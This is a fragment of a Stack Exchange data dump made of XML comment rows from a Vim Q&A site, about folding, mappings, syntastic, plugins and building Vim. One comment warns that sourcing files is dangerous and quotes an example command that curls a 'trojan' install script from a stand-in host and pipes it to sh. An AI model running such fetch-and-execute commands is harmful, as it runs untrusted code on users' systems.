  <row Id="3340" PostId="3120" Score="0" Text="I used your gnome terminal instructions, so now the backspace key generates a &quot;ASCII delete&quot;, and the backspace key still works fine. That part is good. The problem is, I can't seem to override the mapping of control h, I suspect because it still tries to handle it as a backspace-like thing" CreationDate="2015-04-30T05:01:47.523" UserId="1907" />
  <row Id="3341" PostId="3125" Score="0" Text="I get error message ``E350: Cannot create fold with current 'foldmethod'`` after pressing keys ``zf``." CreationDate="2015-04-30T06:04:07.253" UserId="147" />
  <row Id="3342" PostId="3125" Score="0" Text="@niekas: Set `foldmethod` to `manual` first." CreationDate="2015-04-30T06:06:34.627" UserId="1577" />
  <row Id="3343" PostId="3125" Score="0" Text="@lcd047 Thats great! Thank you very much. @200_success should add ``:set foldmethod=manual`` to his answer." CreationDate="2015-04-30T06:09:12.460" UserId="147" />
  <row Id="3344" PostId="3109" Score="1" Text="This plugin is not a complete solution for your problem, but it's tremendously useful for adding columns of numbers: [VisIncr](http://vim.sourceforge.net/scripts/script.php?script_id=670).  Docs [here](http://www.drchip.org/astronaut/vim/doc/visincr.txt.html).  FWIW." CreationDate="2015-04-30T06:18:41.547" UserId="1577" />
  <row Id="3345" PostId="3125" Score="0" Text="I got one more problem. I have ``.rst`` file with section ``Test\n====``. When I select several paragraphs of this section and press ``zf`` all section gets folded instead of the selected paragraphs. How do I turn this automation off?" CreationDate="2015-04-30T06:25:31.833" UserId="147" />
  <row Id="3346" PostId="3125" Score="1" Text="If a new fold you are trying to create partially overlaps with an existing open fold, then closing the new fold will cause overlapping folds to close too. You may need to delete some folds using `zd` first." CreationDate="2015-04-30T06:56:23.450" UserId="24" />
  <row Id="3347" PostId="3126" Score="0" Text="I am unable to edit your answer but I believe you meant `:%s/\v\n\n#\s+(.*)/^M^Mrunning &quot;\1&quot;/` (added the &quot;magic&quot; flag). It is really hard to pick a correct answer for my original question, but I feel this answer is the closest to my original expected answer. It is also the only one that works throughout the whole file without any need for selecting a range." CreationDate="2015-04-30T07:31:29.017" UserId="131" />
  <row Id="3348" PostId="3126" Score="0" Text="IIRC you can use `\r` instead of `^M` to get new lines?" CreationDate="2015-04-30T08:18:11.503" UserId="205" />
  <row Id="3349" PostId="3128" Score="0" Text="Have you considered posting to the vim_dev list?" CreationDate="2015-04-30T10:05:53.633" UserId="1577" />
  <row Id="3350" PostId="3089" Score="0" Text="@tommcdo in `mvim -v` it works! Both in and outside of tmux! Boy am I glad... I'm just gonna alias that now. No idea what broke it in the first place, but I'm just glad this works. Thanks! If you make your comment an answer, I'll accept it." CreationDate="2015-04-30T10:36:05.777" UserId="1842" />
  <row Id="3352" PostId="3131" Score="0" Text="You might have a look at vim-dispatch: https://github.com/tpope/vim-dispatch" CreationDate="2015-04-30T11:39:41.090" UserId="284" />
  <row Id="3353" PostId="3107" Score="0" Text="I tested it, and that's not how it works for me.  If the record the macro, then use it using `@{reg}`, you can repeat it with `.` afterwards." CreationDate="2015-04-30T12:07:00.603" UserId="865" />
  <row Id="3354" PostId="3107" Score="0" Text="You're just repeating the last command of the macro, which is `D`. After a `0D` operation, your cursor will be left in column 0. If your cursor is already on the beginning of the line (after you move to another one), it will look like the macro was properly repeated. Try moving the cursor forward in the line and typing `.` -- you'll see that it only repeats `D`." CreationDate="2015-04-30T12:11:03.940" UserId="64" />
  <row Id="3355" PostId="3131" Score="0" Text="I love [ConqueTerm](https://code.google.com/p/conque/)" CreationDate="2015-04-30T12:59:45.500" UserId="1145" />
  <row Id="3356" PostId="3130" Score="0" Text="Alternatively, use [Homebrew](http://brew.sh/) and run `brew install vim --override-system-vi`." CreationDate="2015-04-30T14:04:43.050" UserId="131" />
  <row Id="3357" PostId="3107" Score="0" Text="Ah, my mistake." CreationDate="2015-04-30T15:19:44.167" UserId="865" />
  <row Id="3358" PostId="3123" Score="1" Text="Thank you so much, this helps me a lot to quickly scan trough my files." CreationDate="2015-04-30T16:41:54.617" UserId="1921" />
  <row Id="3359" PostId="2077" Score="0" Text="Do note that you can set vim's internal options using `let` by doing `let &amp;{option name}=value`" CreationDate="2015-04-30T16:51:55.703" UserId="865" />
  <row Id="3360" PostId="3113" Score="0" Text="See @Nobilis answer: `S` is documented as &quot;Synonym for `cc`&quot;" CreationDate="2015-04-30T17:05:22.673" UserId="925" />
  <row Id="3361" PostId="3131" Score="0" Text="[How to execute shell commands silently?](https://vi.stackexchange.com/questions/1942/how-to-execute-shell-commands-silently/1947?s=1|0.1919#1947) is also very similar (but doesn't cover the 'mini-terminal' part)." CreationDate="2015-04-30T17:25:19.460" UserId="51" />
  <row Id="3362" PostId="2693" Score="0" Text="thanks for the response, sorry for the slow reply. If I went for the lo-fi autocmd approach, i.e. `autocmd FileType markdown set sidescrolloff=0`, doesn't that require me to then create a corresponding autocmd for every other filetype I use (since it's a global option). Is there a way to create an autocmd that only applies for files that are *not* type XYZ?" CreationDate="2015-04-30T21:51:25.883" UserId="91" />
  <row Id="3364" PostId="3138" Score="0" Text="That is what I thought of when I asked this question.   The solution to that would just be to move the cursor back if it is on the end of the line in insert mode, and not every time you exit it." CreationDate="2015-04-30T23:00:22.737" UserId="865" />
  <row Id="3366" PostId="3140" Score="0" Text="Related: http://unix.stackexchange.com/questions/11402/why-does-esc-move-the-cursor-back-in-vim" CreationDate="2015-05-01T00:43:28.570" UserId="46" />
  <row Id="3367" PostId="3139" Score="0" Text="You seem to be missing a link in the question" CreationDate="2015-05-01T00:45:49.453" UserId="46" />
  <row Id="3370" PostId="3139" Score="0" Text="thanks! Fixed it." CreationDate="2015-05-01T00:49:23.967" UserId="1806" />
  <row Id="3371" PostId="3140" Score="1" Text="Ah, that makes sense.  Really the only way of avoiding this behavior is to make it so that if you exit from an insert mode started with `i` that the cursor moves to the right, and if it is started with `a` it moves to the left." CreationDate="2015-05-01T00:49:33.163" UserId="865" />
  <row Id="3372" PostId="3139" Score="0" Text="Have you looked at the `$VIMRUNTIME/syntax/c.vim` (or any other syntax file in the folder)? There are a lot of examples in there." CreationDate="2015-05-01T00:52:34.583" UserId="46" />
  <row Id="3373" PostId="3139" Score="2" Text="This should be fairly simple if you look at a tutorial on it.  I honestly don't see a question here.  If you want to learn how to accomplish the syntax grouping of the things you listed, you might want to take a look at chapters 45 through 47 of http://learnvimscriptthehardway.stevelosh.com/" CreationDate="2015-05-01T00:55:04.903" UserId="865" />
  <row Id="3374" PostId="3139" Score="0" Text="I'll have a look. Thanks for the advance!" CreationDate="2015-05-01T00:59:02.227" UserId="1806" />
  <row Id="3378" PostId="3140" Score="0" Text="@EvergreenTree Correct. You could probably add some mappings that create a buffer local variable that say whether you entered with `i` or `a` and then check that variable when you exit insert mode. However I don't know what you would want to happen if you entered insert mode with `s` or `c`. I'm probably also missing other ways to enter insert mode." CreationDate="2015-05-01T03:37:13.160" UserId="46" />
  <row Id="3379" PostId="3136" Score="0" Text="works perfectly, thanks a lot :)" CreationDate="2015-05-01T10:57:01.867" UserId="1821" />
  <row Id="3380" PostId="3135" Score="0" Text="thanks for your answer and for the link to the documentation :)" CreationDate="2015-05-01T10:59:03.153" UserId="1821" />
  <row Id="3381" PostId="3140" Score="0" Text="that is true.  That is the problem with workarounds in vim, there is always some case that you didn't account for." CreationDate="2015-05-01T11:53:52.983" UserId="865" />
  <row Id="3382" PostId="2693" Score="0" Text="Yes, you can do that with a global autocmd and a conditional: `autocmd FileType * if &amp;filetype != 'markdown' | set sidescrolloff=3 | endif`; I would then combine this with the other (positive) one via `else`." CreationDate="2015-05-01T12:59:44.007" UserId="970" />
  <row Id="3383" PostId="3128" Score="0" Text="I'll post anything useful back here, but here's the [vim_dev list posting](https://groups.google.com/forum/?hl=en_US#!topic/vim_dev/yPvUeVi96ug)" CreationDate="2015-05-01T13:00:51.307" UserId="1406" />
  <row Id="3384" PostId="3128" Score="0" Text="I think your test case is wrong. If I make a test file, and add some text (by just doing `iHello&lt;Esc&gt;`, the `g:c` variable is also increased to `20`, then doing `oWorld&lt;Esc&gt;` makes it `38` ... So the number of  evaluations `foldexpr` seems unrelated to using completion... Try [loading Vim with a minimal vimrc file](http://vi.stackexchange.com/q/2003/51) and see if the problem still occurs, it could be another setting or a plugin." CreationDate="2015-05-01T15:56:06.630" UserId="51" />
  <row Id="3385" PostId="3128" Score="0" Text="*&quot;I can't see the value in having foldexpr consulted while running through auto completes, &quot;* well, you're inserting text; so Vim needs to re-calculate which lines to fold." CreationDate="2015-05-01T16:10:27.413" UserId="51" />
  <row Id="3386" PostId="3128" Score="0" Text="The test case is deliberately stupid, returning =. But just from the order of magnitude you can see something is up. On 2nd comment, Yeah, but I think it should do that at the end of an insert candidate (like it does for `p`), I think what it's doing is doing it per character of the insert candidate." CreationDate="2015-05-01T16:21:27.710" UserId="1406" />
  <row Id="3387" PostId="3128" Score="0" Text="@artfulrobot I don't see that &quot;anything is up&quot;? I get similar numbers *without* using completion... It seems like a feature to me, if I type a `{` or `}` (for example), this might influence folding, and you usually want that to happen immediately... If it didn't, we'd have people here complaining about the delay in showing folds ;-) In any case, I suspect the *real* problem here is that your `foldexpr` is too slow/complicated; once you've verified there isn't another setting or plugin in the way, you should probably post your `foldexpr` and a test file, so we can have a look at that..." CreationDate="2015-05-01T16:27:41.770" UserId="51" />
  <row Id="3388" PostId="3145" Score="0" Text="Thanks, will try this. As for specific foldexpr see https://github.com/tmhedberg/SimpylFold for python, and https://github.com/swekaj/php-foldexpr.vim for php. But yes, we both agree that's another question!" CreationDate="2015-05-01T18:32:56.430" UserId="1406" />
  <row Id="3389" PostId="3139" Score="2" Text="@DCPY Try to make a syntax file first, starting with just a single highlight. If you run into problems, you're of course welcome to ask one (or more!) question(s) about it. Post the code that you've tried so far, explain what exactly what you want to do, and what doesn't work." CreationDate="2015-05-01T18:57:33.827" UserId="51" />
  <row Id="3390" PostId="3145" Score="0" Text="@artfulrobot The Python `foldexpr` is also quite slow for me... I'm not sure this can be improved on in this specific case, so this work-around might be best here :-/ Not sure why the PHP foldexpr is required? Can't the syntax file do that (this is usually faster)" CreationDate="2015-05-01T18:59:10.720" UserId="51" />
  <row Id="3392" PostId="3128" Score="0" Text="As I suspected: &quot;Right, it's actually worse than that: the entire folding is&#xA;redone at every key press.&quot; From the dev list. Workarounds below look like the way forward!" CreationDate="2015-05-01T22:00:05.087" UserId="1406" />
  <row Id="3393" PostId="3149" Score="0" Text="Can you clarify what you mean by &quot;basically nothing&quot; from inside a function? It does do the standard thing (it temporarily stops highlighting the search until the next time search is invoked)." CreationDate="2015-05-02T00:33:42.130" UserId="390" />
  <row Id="3394" PostId="3149" Score="0" Text="I'm also sort of hoping to find a way to access the flag that controls whether the transient `:nohlsearch` is in effect or not... I think in its absence I have to resort to tracking all the `:nohlsearch` calls with a variable." CreationDate="2015-05-02T00:37:35.163" UserId="390" />
  <row Id="3395" PostId="3149" Score="0" Text="@StevenLu see edits." CreationDate="2015-05-02T00:41:29.527" UserId="46" />
  <row Id="3396" PostId="3149" Score="0" Text="Thanks. Looks like the code I have been using hacks around the &quot;basically doing nothing&quot; aspect of it by doing this: `nnoremap &lt;silent&gt; &lt;expr&gt; &lt;boundkey&gt; SearchHighlight()` where `SearchHighlight()` may return a string `&quot;:silent nohlsearch\&lt;CR&gt;&quot;`. Also thank you for the `v:hlsearch` tip, just what I needed." CreationDate="2015-05-02T00:46:36.153" UserId="390" />
  <row Id="3397" PostId="2986" Score="0" Text="There is also a [PR](https://github.com/tpope/vim-surround/pull/118) to add `dsf` to surround.vim itself." CreationDate="2015-05-02T07:57:09.197" UserId="1292" />
  <row Id="3399" PostId="2150" Score="0" Text="Note I've noticed an issue with this: you *only* save the contents of the current session to the undo file. This is different from the default behaviour, where the contents of the previous session + all info already in the undo file is saved ... The way to fix this, would be to read the undo file, merge the undo changes, and then write the undo file ... But this doesn't seem possible ... :-/" CreationDate="2015-05-02T21:39:06.920" UserId="51" />
  <row Id="3400" PostId="3152" Score="0" Text="While this works, it can be considered dangerous since you're just sourcing a file, and executing *all* commands in it (including shell commands, such as `system('curl http://example.com/install-trojan.sh | sh')` ..." CreationDate="2015-05-02T23:50:24.260" UserId="51" />
  <row Id="3401" PostId="3153" Score="5" Text="&quot;vim is not formatting them correctly&quot; No, Vim formats them *correctly*. What it doesn't do is format them *how you want*. For that you will need to find a specialized command-line xml formatter and use it from Vim either with `:!&lt;external command&gt;` or with `:help 'formatprg'` or `:help equalprg`." CreationDate="2015-05-03T07:25:45.317" UserId="54" />
  <row Id="3402" PostId="836" Score="1" Text="So, there is no difference between `&lt;Leader&gt;` and `&lt;leader&gt;`, right?" CreationDate="2015-05-03T11:31:30.157" UserId="1963" />
  <row Id="3404" PostId="3153" Score="0" Text="It's automatic code format I'm talking about. Even if I manually type a line break, after auto xml format, everything goes back to the original format." CreationDate="2015-05-03T12:34:07.610" UserId="1276" />
  <row Id="3405" PostId="3154" Score="0" Text="damn I did not check the doc, I was sure it was C-z not sure why..." CreationDate="2015-05-03T12:50:54.273" UserId="590" />
  <row Id="3406" PostId="3154" Score="0" Text="Well, `&lt;C-z&gt;` does make more sense; a (the first letter) to increase, and z (the last letter) to decrease ... But `&lt;C-z&gt;` can't be used because it's already used to suspends programs in terminals. I suspect the x was chosen because it's next to the z (on qwerty layouts anyway)." CreationDate="2015-05-03T12:59:11.290" UserId="51" />
  <row Id="3407" PostId="3153" Score="0" Text="What are you using to automatically format the xml?" CreationDate="2015-05-03T16:20:54.380" UserId="865" />
  <row Id="3408" PostId="3156" Score="0" Text="This question was [also posted to Stack Overflow](http://stackoverflow.com/q/30016143/660921)" CreationDate="2015-05-03T16:46:37.210" UserId="51" />
  <row Id="3409" PostId="3156" Score="0" Text="Indeed I made a double post by mistake I flagged it a few minutes ago to know what I should do." CreationDate="2015-05-03T16:50:07.567" UserId="1841" />
  <row Id="3410" PostId="2770" Score="0" Text="What do the first 2 lines do? As far as I can see, the assigned variables aren't used, and if I remove those lines, it still works." CreationDate="2015-05-03T23:02:52.423" UserId="51" />
  <row Id="3411" PostId="3153" Score="0" Text="I'm not clear what is vim currently automatically formatting xml, I installed the Chiel92/vim-autoformat plugin, and I think for xml files, it will use &quot;tidy&quot; program bundled with mac os to format it." CreationDate="2015-05-03T23:03:04.113" UserId="1276" />
  <row Id="3412" PostId="2916" Score="0" Text="This stops at the number 9, and above 10 it increments by 11, not 10 ... I think this is unintentional (ie. a bug)? In addition, you always want to use non-recursive mapping (`noremap`) and **never** `map`. See [this page](http://learnvimscriptthehardway.stevelosh.com/chapters/05.html)  for a more detailed explanation of that." CreationDate="2015-05-04T00:01:25.403" UserId="51" />
  <row Id="3413" PostId="3153" Score="0" Text="I don't know why I'm getting down votes. Does anyone have a solution for this problem? or I'm just the only one who wants this?" CreationDate="2015-05-04T00:24:52.117" UserId="1276" />
  <row Id="3415" PostId="3153" Score="0" Text="The problem with your original question is that you didn't really describe what you did. You just said &quot;not formatting them correctly&quot;, with no mention of what commands you used." CreationDate="2015-05-04T01:07:17.043" UserId="51" />
  <row Id="3417" PostId="2823" Score="0" Text="You should add the case for when you are on `}` to keep the muscle memory the same." CreationDate="2015-05-04T03:04:16.787" UserId="895" />
  <row Id="3419" PostId="3163" Score="0" Text="Try adding extra `&lt;CR&gt;` at the end of mapping: `nnoremap K :grep! &quot;\b&lt;C-R&gt;&lt;C-W&gt;\b&quot;&lt;CR&gt;:cw&lt;CR&gt;&lt;CR&gt;` ." CreationDate="2015-05-04T10:49:40.910" UserId="1782" />
  <row Id="3421" PostId="3163" Score="0" Text="I have it in both. However, adding an extra CR works" CreationDate="2015-05-04T10:55:45.297" UserId="1620" />
  <row Id="3422" PostId="3163" Score="4" Text="Mapping the mapping 'silent' also works: `nnoremap &lt;silent&gt; K ...`, this will prevent you from seeing the shell output from `ag`. I'm not sure if this is the 'proper' way to fix  this, though." CreationDate="2015-05-04T11:07:32.893" UserId="51" />
  <row Id="3423" PostId="3163" Score="1" Text="See also the [ag.vim](https://github.com/rking/ag.vim) plugin for a much nicer interface." CreationDate="2015-05-04T12:15:03.320" UserId="1577" />
  <row Id="3424" PostId="3167" Score="0" Text="I was hacking a little with your plugin, it does pretty great stuff. Thank you! But actually I wanted more `:bp`, `:bn`-like behaviour, I mean cycling jumping between _current_ buffers. So I don't want jump onto already deleted buffers and want to jump on the first one if it was last buffer in the list of accessed buffers." CreationDate="2015-05-04T14:21:13.567" UserId="500" />
  <row Id="3425" PostId="3167" Score="0" Text="Well, you could modify my plugin / take some parts to build your own. Actually, I use a slightly different approach to the problem; see my edit." CreationDate="2015-05-04T14:44:45.407" UserId="970" />
  <row Id="3426" PostId="3170" Score="1" Text="Maybe consider a more light weight plugin such as https://github.com/LaTeX-Box-Team/LaTeX-Box" CreationDate="2015-05-04T18:30:30.990" UserId="46" />
  <row Id="3427" PostId="3170" Score="0" Text="@FDinoff: Oh yes, using another plugin which also has this feature could work as well. :)" CreationDate="2015-05-04T18:39:07.797" UserId="1955" />
  <row Id="3428" PostId="3165" Score="0" Text="Related question: [How to achieve selection different length of texts on different lines](http://vi.stackexchange.com/q/2796/51)" CreationDate="2015-05-04T18:51:12.697" UserId="51" />
  <row Id="3429" PostId="3171" Score="0" Text="Honestly, vimtex seems to be *way* better then LaTeX-Box. I spent the last hour copying vim-latex‘ `*.latexmain` behavior, that‘s not needed here. Also you completions show `\tag{foo}` tags, that‘s also nice." CreationDate="2015-05-04T21:57:59.127" UserId="1955" />
  <row Id="3430" PostId="3161" Score="0" Text="Thanks Carpetsmoker, thanks for even teaching me how to find solution for problems. It's very useful." CreationDate="2015-05-05T00:05:44.423" UserId="1276" />
  <row Id="3432" PostId="3171" Score="0" Text="Thanks @Keba! I appreciate the feedback. Please don't hesitate to open issues if you find any bugs/have any problems/have ideas for new features." CreationDate="2015-05-05T06:02:40.920" UserId="21" />
  <row Id="3435" PostId="3165" Score="0" Text="I always think in vim multiple selections/cursors function is just eye-candy..." CreationDate="2015-05-05T08:30:34.973" UserId="1569" />
  <row Id="3436" PostId="2770" Score="0" Text="@Carpetsmoker Those lines (now deleted) were good old-fashioned cruft. If you watch the talk, you'll see that Conway arrives at this solution after a few iterations. The unnecessary variables were used in the earlier variations, but not in this one. I copied it over into my .vimrc before I really started learning vimscript, and obviously never looked at the code again, even when pasting it into my answer! Well spotted." CreationDate="2015-05-05T11:29:08.730" UserId="343" />
  <row Id="3437" PostId="3174" Score="1" Text="I can't reproduce this using `vim -u NONE -U NONE -N`. It might be an issue with your vimrc or a plugin." CreationDate="2015-05-05T11:39:31.637" UserId="865" />
  <row Id="3441" PostId="3174" Score="1" Text="Happens for me even with -u NONE -U NONE -N. I use v7.4 on arch linux" CreationDate="2015-05-05T13:39:16.440" UserId="1982" />
  <row Id="3442" PostId="3174" Score="0" Text="@EvergreenTree I have the same problem. With `vim -u NONE -U NONE -N fold-test` and just setting `foldmethod=marker`. I'm running Vim 7.4.712 on Arch. If I try the same with Vim on Vim 7.4.160 on CentOS 7, I get exactly the opposite results (all folds open when using `:m+1`). And Vim 7.2.441 on CentOS 6 works fine... All `fold*` settings seem to be the same on these machines." CreationDate="2015-05-05T13:41:59.847" UserId="51" />
  <row Id="3443" PostId="3174" Score="0" Text="That is very strange.  This seems like a bug." CreationDate="2015-05-05T14:35:34.707" UserId="865" />
  <row Id="3444" PostId="3171" Score="1" Text="As you may have noticed, I already did that (on github). :)" CreationDate="2015-05-05T16:29:46.473" UserId="1955" />
  <row Id="3445" PostId="3178" Score="0" Text="Ah, I didn't realize that!  Good observation.  I would use the runtime solution if I needed this for other filetypes." CreationDate="2015-05-05T18:24:49.403" UserId="865" />
  <row Id="3446" PostId="3174" Score="2" Text="That might be caused by patch 7.4.700 which tries to prevent, that folds get invalid on :move commands" CreationDate="2015-05-05T20:36:42.847" UserId="71" />
  <row Id="4447" PostId="3179" Score="1" Text="It seems to work for me in Windows. I installed Vim from the vim homepage, and used the default config." CreationDate="2015-05-06T10:11:57.973" UserId="51" />
  <row Id="4448" PostId="3179" Score="0" Text="Do you have a non-English keyboard layout? Does this also happen in a plain `gvim -N -u NONE`?" CreationDate="2015-05-06T10:40:09.340" UserId="970" />
  <row Id="4449" PostId="3179" Score="0" Text="@ingo I'm using an extended english keyboard (UK). Using the given options the keys do work as intended." CreationDate="2015-05-06T10:45:24.997" UserId="1057" />
  <row Id="4450" PostId="3179" Score="0" Text="Then you may have a mapping interfering. Check with `:verbose map &lt;C-[&gt;` and `:verbose map &lt;C-]&gt;` (when those don't work)." CreationDate="2015-05-06T10:56:38.453" UserId="970" />
  <row Id="4451" PostId="3179" Score="0" Text="@Ingo no mapping for these unfortunately." CreationDate="2015-05-06T11:01:01.317" UserId="1057" />
  <row Id="4452" PostId="3179" Score="0" Text="Too bad. Then I don't know any other way to troubleshoot than binary partitioning of your configuration: Comment out / remove half of your `~/.vimrc`, and repeat until the problem's gone. Same for used plugins." CreationDate="2015-05-06T11:09:06.577" UserId="970" />
  <row Id="4453" PostId="3179" Score="1" Text="@Ingo Oh my bad. It seems that's it's the keyboard problem. The `gvim -N -u NONE` does not change the problem (my keyboard must have change inadvertently to the normal UK I guess when I tested)." CreationDate="2015-05-06T11:19:49.453" UserId="1057" />
  <row Id="4457" PostId="3183" Score="1" Text="Cool. Now there seems to be too **many** ways to solve my problem! I understand that you combined both mechanisms in the example you gave in order to illustrate how to use them. But I wonder if it isn't sufficient to just use `nnoremap &lt;M-.&gt; :&lt;C-u&gt;call MyAmazingEnhancedDot(v:count1)&lt;cr&gt;` and skip the `command -count=1 EDot call MyAmazingEnhancedDot(&lt;count&gt;)`?" CreationDate="2015-05-07T04:01:43.417" UserId="390" />
  <row Id="4458" PostId="3183" Score="0" Text="Skipping the command option is fine. The only benefit you get from the command option is being able to call it from ex commands such as `:9EDot`. If you don't use ex commands a lot then skip it." CreationDate="2015-05-07T04:16:56.290" UserId="895" />
  <row Id="4459" PostId="2770" Score="0" Text="I recently replaced the vim-pulse (i think it's called) addon with this snippet and it's much better/faster" CreationDate="2015-05-07T07:49:11.553" UserId="248" />
  <row Id="4460" PostId="3184" Score="0" Text="IIRC, to install on custom directory, when you `./configure`, you need to add `--prefix=/home/[user]`. Or maybe `--prefix=/home/[user]/vim74`." CreationDate="2015-05-07T09:04:29.993" UserId="1782" />
  <row Id="4461" PostId="3184" Score="2" Text="Or try with `let $VIMRUNTIME=&quot;/home/[user]/vim74/&quot;` (without `runtime` ending)." CreationDate="2015-05-07T09:20:16.703" UserId="1782" />
  <row Id="4462" PostId="3184" Score="0" Text="@tivn Naively I was trying to run with the runtime as it was in the _source_. I had never run make install (because I wanted to keep everything in ~). configure with a prefix and a make install did resolve the issue. If you want to post that as an answer, I'll accept it." CreationDate="2015-05-07T09:26:15.853" UserId="2004" />
  <row Id="4463" PostId="3184" Score="0" Text="ok, I will write as answer" CreationDate="2015-05-07T09:32:07.903" UserId="1782" />
  <row Id="4464" PostId="3187" Score="0" Text="you have a missing colon in first command." CreationDate="2015-05-07T15:29:32.197" UserId="599" />
  <row Id="4465" PostId="3187" Score="0" Text="Typo fixed. Thanks." CreationDate="2015-05-07T16:03:49.397" UserId="54" />
  <row Id="4466" PostId="3190" Score="0" Text="Which version of clang do you have? According to [this page](http://clang.llvm.org/cxx_status.html) you need at least version 3.4 for `-std=c++14` to work. For earlier versions, you need to use `-std=c++1y` (invalid values for `-std` seem to be ignored)." CreationDate="2015-05-07T16:39:11.023" UserId="51" />
  <row Id="4467" PostId="3190" Score="0" Text="Do you also have YCM installed?" CreationDate="2015-05-07T17:13:31.823" UserId="1577" />
  <row Id="4468" PostId="3190" Score="0" Text="I have clang 3.6 installed, thus it should work :·)" CreationDate="2015-05-07T17:23:40.487" UserId="1463" />
  <row Id="4469" PostId="3190" Score="0" Text="Yes, I have YCM installed. Are there any incompatibilities with it?" CreationDate="2015-05-07T17:24:08.257" UserId="1463" />
  <row Id="4470" PostId="3190" Score="0" Text="Because YCM disables syntastic checks by default.  With recent versions of syntastic the `:SyntasticInfo` command will tell you that (provided that you run in against a C++ file)." CreationDate="2015-05-07T17:26:58.560" UserId="1577" />
  <row Id="4471" PostId="3190" Score="0" Text="According to [this site](http://stackoverflow.com/questions/24500281/youcompleteme-and-syntastic-compatibility), YCM is checking the file. Am I right?" CreationDate="2015-05-07T17:52:17.360" UserId="1463" />
  <row Id="4472" PostId="3190" Score="0" Text="Try `:help syntastic-ycm` for a shorter version.  But basically, yes, if you didn't set `g:ycm_show_diagnostics_ui` to 0, it's YCM that checks the file." CreationDate="2015-05-07T17:57:11.813" UserId="1577" />
  <row Id="4473" PostId="3190" Score="0" Text="Thank you  lcd047! Now that I added &quot;let g:ycm_show_diagnostics_ui = 0&quot; to my .vimrc, I have syntastic checking it! But it is talking about C++11 and not 14!: &quot; 'auto' type specifier is a C++11 extension [-Wc++11-extensions] [cpp/clang_check] &quot;" CreationDate="2015-05-07T18:04:45.033" UserId="1463" />
  <row Id="4474" PostId="3191" Score="1" Text="Thanks! Turns out it comes from the aliases that oh-my-zsh provides: https://github.com/robbyrussell/oh-my-zsh/wiki/Cheatsheet#helpful-aliases-for-common-git-tasks" CreationDate="2015-05-07T18:05:42.597" UserId="226" />
  <row Id="4475" PostId="3188" Score="0" Text="You may want to try to compile with the clean source code rather than using compiled source tree from first machine. Or perhaps you can check suggested answer for similar error message here: http://stackoverflow.com/questions/23281050/makefile-warning-warning-file-main-cpp-has-modification-time-2-1e04-s-in-th" CreationDate="2015-05-07T18:06:16.290" UserId="1782" />
  <row Id="4476" PostId="3190" Score="0" Text="What does this label tell you: `[cpp/clang_check]`? :)" CreationDate="2015-05-07T18:17:14.613" UserId="1577" />
  <row Id="4477" PostId="3190" Score="0" Text="Most issues with syntastic are actually issues with the checker used by syntastic, not with syntastic itself. Read your checker's documentation or find another checker that satisfies your requirements." CreationDate="2015-05-07T18:22:23.170" UserId="54" />
  <row Id="4479" PostId="3190" Score="0" Text="Ok, I understood what [cpp/clang_check] is! :·)&#xA;ok! Let's configure clang-check! &quot; cpp/clang_check &quot; points to &quot; c/clang_check &quot;. And at this point, I'm a bit lost. Is clang-check the same as clang, or a sub-part or anything else? I can't find how to configure it. Should I configure it directly or configure how Syntastic uses it?" CreationDate="2015-05-07T18:46:15.363" UserId="1463" />
  <row Id="4480" PostId="3188" Score="0" Text="If you can move the source compilation to a local disk (one not on a network drive). Run make clean and reconfigure the project (you might need to touch all the files in the tree to set the modification time to now.) Then recompile." CreationDate="2015-05-07T18:46:30.257" UserId="46" />
  <row Id="4481" PostId="3190" Score="0" Text="Please consider reading the docs before you read the sources.  Start with `:help syntastic`, skim through the [FAQ](https://github.com/scrooloose/syntastic#faq), then read the docs for the relevant [checkers](https://github.com/scrooloose/syntastic/wiki/Syntax-Checkers).  `clang-check` is a separate program (part of the CLANG project, but not the same as the compiler), and it has its own checker in syntastic.  You can read about it [here](https://github.com/scrooloose/syntastic/wiki/C--%3A---clang_check).  But really, carefully reading the docs can save you a lot of time." CreationDate="2015-05-07T18:58:10.597" UserId="1577" />
  <row Id="4482" PostId="3190" Score="0" Text="Actually, I did check the documentation, but did not understand how to add &quot;-std=c++14&quot; to it. And now I just realized that what I want to do is to add an argument, thus &quot; let g:syntastic_cpp_clang_check_post_args = &quot;-std=c++14&quot; &quot; ! And it works just fine! Thank you all!" CreationDate="2015-05-07T19:21:24.783" UserId="1463" />
  <row Id="4483" PostId="3192" Score="1" Text="Note that you're using gcc now, and not clang (clang has much better errors)." CreationDate="2015-05-07T19:37:11.990" UserId="51" />
  <row Id="4484" PostId="3192" Score="0" Text="@Carpetsmoker: He's actually using `clang-check`, which is essentially the same as clang's parser.  On a side note, `clang-tidy` is interesting too." CreationDate="2015-05-07T19:45:39.443" UserId="1577" />
  <row Id="4485" PostId="3190" Score="0" Text="The point is, in order to know __where__ to add it you really have to understand what syntastic is doing.  There is no such thing as telling syntastic &quot;use `--std=c++14` for C++&quot;.  The interface is downright barbaric, and it's way more complicated than it should be.  There are other serious problems with it too, f.i. not being able to infer compilation flags from makefiles.  But it's the best I could come up with given Vim's API. :(" CreationDate="2015-05-07T19:55:03.350" UserId="1577" />
  <row Id="4486" PostId="3183" Score="0" Text="Awesome. Now your perfect answer is complete!" CreationDate="2015-05-07T20:31:08.480" UserId="390" />
  <row Id="4488" PostId="3192" Score="0" Text="I am really sorry but I have to change my answer, because, as I came back to Vim and typed in something that would cause an error, I realized that actually, syntastic does NOT CORRECT AT ALL! Thats why it did not give anything about 'auto'.&#xA;&#xA;I know that it is only bypassing this problem, but by using gcc as syntastic checker and compiler, it works just fine! (really, this time!)." CreationDate="2015-05-07T21:08:09.367" UserId="1463" />
  <row Id="4490" PostId="3194" Score="0" Text="Is this the same problem as [issue 208](https://code.google.com/p/vim/issues/detail?id=208)? Please report there how to solve it, so we can perhaps change it later." CreationDate="2015-05-08T07:16:00.443" UserId="71" />
  <row Id="4491" PostId="3194" Score="0" Text="I think that is the same problem with this. I posted a comment there. Thank you for noting me." CreationDate="2015-05-08T08:37:45.980" UserId="2009" />
  <row Id="4492" PostId="3194" Score="0" Text="Thanks for updateing the issue" CreationDate="2015-05-08T08:44:51.647" UserId="71" />
  <row Id="4494" PostId="3198" Score="2" Text="I get &quot;E11: Invalid in command-line window; &lt;CR&gt; executes, CTRL-C quits&quot;, trying to do this." CreationDate="2015-05-08T09:31:32.667" UserId="2020" />
  <row Id="4495" PostId="3198" Score="1" Text="Please, see my edit." CreationDate="2015-05-08T09:41:50.160" UserId="54" />
  <row Id="4496" PostId="3187" Score="0" Text="Also, this does clobber the `&quot;` register.  I imagine you could use another register if you wanted to, or you could just save the `&quot;` register and restore it afterwards." CreationDate="2015-05-08T11:52:15.323" UserId="865" />
